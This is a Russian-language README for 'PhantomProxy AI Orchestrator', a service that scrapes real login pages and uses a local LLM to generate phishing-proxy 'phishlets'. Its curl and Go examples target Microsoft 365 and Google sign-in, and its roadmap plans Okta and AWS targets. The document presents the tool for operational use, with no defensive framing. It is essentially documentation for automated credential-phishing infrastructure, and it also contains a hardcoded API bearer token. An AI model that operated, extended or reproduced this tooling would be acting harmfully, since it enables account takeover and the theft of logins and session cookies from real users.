# 🤖 PhantomProxy AI Orchestrator

Автоматическая генерация фишлетов через LLM (Ollama + Llama 3)

---

## 📋 ОПИСАНИЕ

AI Orchestrator — это Python микросервис который:

1. **Собирает информацию** о целевом сайте через Playwright
2. **Анализирует** структуру страницы (формы, input'ы, API endpoints)
3. **Генерирует** YAML фишлет через LLM (Llama 3)
4. **Возвращает** готовую конфигурацию для PhantomProxy

---

## 🚀 УСТАНОВКА

### 1. Установка зависимостей

```bash
cd internal/ai
pip install -r requirements.txt
playwright install
```

### 2. Установка Ollama

```bash
# Linux/Mac
curl -fsSL https://ollama.com/install.sh | sh

# Windows
# Скачать с https://ollama.com/download

# Pull модели
ollama pull llama3.2
```

### 3. Запуск сервиса

```bash
python orchestrator.py
```

Сервис запустится на `http://localhost:8081`

---

## 📡 API ENDPOINTS

### POST /api/v1/generate-phishlet

Генерация фишлета по URL.

**Request:**
```json
{
  "target_url": "https://login.microsoftonline.com",
  "template": "microsoft365",
  "options": {}
}
```

**Response:**
```json
{
  "success": true,
  "phishlet_yaml": "author: '@ai-orchestrator'\nmin_ver: '1.0.0'\n...",
  "analysis": {
    "forms_found": 2,
    "inputs_found": 5,
    "api_endpoints_found": 3,
    "js_files_found": 10
  },
  "message": "Phishlet generated for https://..."
}
```

### GET /api/v1/analyze/:url

Анализ сайта без генерации фишлета.

**Response:**
```json
{
  "url": "https://...",
  "title": "Sign In",
  "forms": [...],
  "inputs": [...],
  "api_endpoints": [...],
  "js_files": [...]
}
```

### GET /health

Проверка здоровья.

---

## 🔗 ИНТЕГРАЦИЯ С PHANTOMPROXY

### Через Go API

```go
import "github.com/phantom-proxy/phantom-proxy/internal/ai"

// Создание клиента
orchestrator := ai.NewAIOrchestrator("http://localhost:8081", logger)

// Генерация фишлета
resp, err := orchestrator.GeneratePhishlet(ctx, ai.GenerateRequest{
    TargetURL: "https://login.microsoftonline.com",
    Template:  "microsoft365",
})

// Сохранение фишлета
err := os.WriteFile("configs/phishlets/auto_generated.yaml", 
    []byte(resp.PhishletYAML), 0644)
```

### Через HTTP API

```bash
# Из PhantomProxy
curl -X POST http://localhost:8081/api/v1/generate-phishlet \
  -H "Content-Type: application/json" \
  -d '{"target_url": "https://login.microsoftonline.com"}'
```

---

## 🧪 ТЕСТИРОВАНИЕ

### 1. Тест анализа сайта

```bash
curl http://localhost:8081/api/v1/analyze/login.microsoftonline.com
```

### 2. Тест генерации

```bash
curl -X POST http://localhost:8081/api/v1/generate-phishlet \
  -H "Content-Type: application/json" \
  -d '{"target_url": "https://login.microsoftonline.com"}'
```

### 3. Тест через PhantomProxy API

```bash
curl -X POST http://localhost:8080/api/v1/ai/generate-phishlet \
  -H "Authorization: Bearer verdebudget-secret-2026" \
  -H "Content-Type: application/json" \
  -d '{"target_url": "https://login.microsoftonline.com"}'
```

---

## ⚙️ КОНФИГУРАЦИЯ

### Переменные окружения

```bash
OLLAMA_HOST=localhost:11434
OLLAMA_MODEL=llama3.2
PLAYWRIGHT_HEADLESS=true
API_PORT=8081
```

### Промпт для LLM

Промпт находится в `orchestrator.py` (метод `_build_prompt`).

Можно кастомизировать для разных шаблонов:
- `microsoft365`
- `google`
- `custom`

---

## 🛡️ БЕЗОПАСНОСТЬ

### Ограничения

- **Rate limiting**: Не более 10 запросов в минуту к одному домену
- **Timeout**: 120 секунд на генерацию
- **Headless**: Playwright работает в headless режиме

### Рекомендации

1. Запускать в изолированном контейнере
2. Использовать отдельные прокси для scraping
3. Не сохранять чувствительные данные в логах

---

## 📈 МОНИТОРИНГ

### Логи

```bash
tail -f /var/log/ai-orchestrator.log
```

### Метрики

- Количество сгенерированных фишлетов
- Время генерации
- Успешность/ошибки

---

## 🐛 TROUBLESHOOTING

### Ошибка: "LLM didn't generate valid YAML"

**Решение:** Проверить что Ollama работает:
```bash
ollama run llama3.2 "Hello"
```

### Ошибка: "Playwright browser crashed"

**Решение:** Переустановить браузеры:
```bash
playwright install --force
```

### Ошибка: "Connection refused"

**Решение:** Проверить что сервис запущен:
```bash
curl http://localhost:8081/health
```

---

## 📝 ПРИМЕРЫ

### Пример 1: Генерация для Microsoft 365

```bash
curl -X POST http://localhost:8081/api/v1/generate-phishlet \
  -H "Content-Type: application/json" \
  -d '{
    "target_url": "https://login.microsoftonline.com",
    "template": "microsoft365"
  }'
```

### Пример 2: Кастомный шаблон

```bash
curl -X POST http://localhost:8081/api/v1/generate-phishlet \
  -H "Content-Type: application/json" \
  -d '{
    "target_url": "https://accounts.google.com",
    "template": "custom",
    "options": {
      "custom_prompt": "Generate phishlet for Google OAuth"
    }
  }'
```

---

## 🎯 СЛЕДУЮЩИЕ ШАГИ

1. **Добавить поддержку шаблонов**: google, okta, aws
2. **Валидация YAML**: Проверка сгенерированного фишлета
3. **Кэширование**: Кэшировать результаты для одинаковых URL
4. **Batch генерация**: Генерация нескольких фишлетов за раз

---

**Версия:** 1.0.0  
**Автор:** PhantomProxy Team  
**Лицензия:** MIT
